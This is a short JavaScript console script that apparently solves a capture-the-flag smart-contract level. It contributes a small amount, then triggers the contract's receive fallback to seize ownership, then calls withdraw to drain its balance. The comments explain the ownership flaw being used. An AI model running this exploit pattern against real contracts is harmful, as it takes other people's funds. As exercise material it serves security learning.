await contract.contribute({value: 5})
//To hit the fallback, call something non-existing
web3.eth.sendTransaction({
    from: "0xD13Fc9225e1E6a56Dabb76Efd19e72BEdd8a8663",
    value: 1,
    gas: 100000,
    to: "0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB"
})
//the fallback method (recieve) will make you the owner if the value is above 0 and you've made previous contributions
await contract.withdraw()
